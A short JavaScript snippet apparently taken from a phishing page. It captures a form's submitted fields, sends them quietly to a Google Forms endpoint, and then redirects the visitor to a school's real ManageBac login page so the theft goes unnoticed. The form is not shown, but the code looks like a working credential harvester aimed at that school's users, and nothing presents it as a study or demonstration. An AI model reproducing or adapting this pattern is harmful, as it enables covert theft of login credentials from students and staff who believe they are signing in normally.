document.getElementById('googleForm').addEventListener('submit', function(event) {
    event.preventDefault(); // Prevent default form submission

    const form = event.target;
    const formData = new FormData(form);

    // Send the data to Google Forms using fetch
    fetch("https://docs.google.com/forms/d/e/1FAIpQLSeLUzCIfgjmIrQ5_WLAgCwliPWVqVraNd_mS3bSBL7XQs7KfQ/formResponse", {
        method: "POST",
        body: formData,
        mode: "no-cors" 
    }).then(() => {
        window.location.href = "https://stthomas.managebac.com/login";
    }).catch(error => {
        console.error("Error submitting form:", error);
        window.location.href = "https://stthomas.managebac.com/login";
    });
});